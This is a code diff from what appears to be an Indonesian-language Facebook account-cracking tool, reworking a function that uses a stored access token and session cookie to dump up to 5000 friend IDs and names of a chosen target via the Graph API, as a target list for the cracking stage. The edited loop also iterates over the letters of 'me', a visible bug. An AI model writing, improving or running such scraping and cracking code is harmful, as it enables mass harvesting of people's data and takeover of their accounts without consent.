@@ -535,12 +535,7 @@ def menu(my_name,my_id):
     if HaHi in ['']:
         console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! ")
     elif HaHi in ['1','01']:
-        prints(Panel(f"""{P2}     masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=87,style=f"{color_panel}"))
-        user = console.input(f" {H2}• {P2}masukan id atau username : ")
-        if user in["Me","me"]:
-                user = GetUser()
-        Publik(f"https://mbasic.facebook.com/{user}?v=friends")
-        setting()
+        publik()
     elif HaHi in ['2','02']:
         massal()
     elif HaHi in ['3','03']:
@@ -912,23 +907,22 @@ def publikv2():
             print(e)
 
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
-
-
-
 def publik():
 	with requests.Session() as ses:
 		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()		
+		cok = open('.cok.txt','r').read()	
+		prints(Panel(f"""{P2}     masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
 		a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
 		if a in ['me','Me','ME']:
-			try:
-				koH = requests.get('https://graph.facebook.com/v1.0/'+a+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
-				for pi in koH['friends']['data']:
-					try:id.append(pi['id']+'|'+pi['name'])
-					except:continue
-				setting()
-			except Exception as d:
-				print(d)
+			for me in a:
+				try:
+					koH = requests.get('https://graph.facebook.com/v1.0/'+me+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
+					for pi in koH['friends']['data']:
+						try:id.append(pi['id']+'|'+pi['name'])
+						except:continue
+					setting()
+				except Exception as d:
+					print(d)
 		else:
 			try:
 				params = {
